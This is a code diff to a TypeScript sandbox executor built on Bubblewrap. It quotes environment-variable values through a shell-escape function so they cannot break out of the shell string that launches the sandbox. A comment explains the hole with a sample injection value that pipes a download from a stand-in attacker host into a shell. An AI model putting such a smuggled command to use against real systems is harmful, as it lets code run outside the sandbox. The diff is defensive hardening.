@@ -241,7 +241,18 @@ export class BubblewrapSandboxExecutor implements SandboxExecutor {
 				} else {
 					// Use 3-arg form: --setenv KEY VALUE (three separate args).
 					// bwrap parses the 3-arg form unambiguously; value may contain '='.
-					envArgs.push('--setenv', key, value);
+					//
+					// The VALUE is single-quoted through `shellEscape` like every
+					// other interpolated value here (scope paths :224-225, temp
+					// :264, command :284). It is true that bwrap hands --setenv
+					// values straight to execve without shell interpretation — but
+					// that is not the layer that parses this. `wrapCommand` returns
+					// `${binary} ${args.join(' ')}`, a SHELL STRING, and the outer
+					// shell parses it first. An unquoted value containing
+					// `'; curl attacker.tld | sh; echo '` would execute OUTSIDE the
+					// sandbox. `key` needs no quoting: `isValidEnvKey` constrains it
+					// to /^[a-zA-Z_][a-zA-Z0-9_]*$/, which is shell-inert.
+					envArgs.push('--setenv', key, `'${shellEscape(value)}'`);
 				}
 			}
 		}
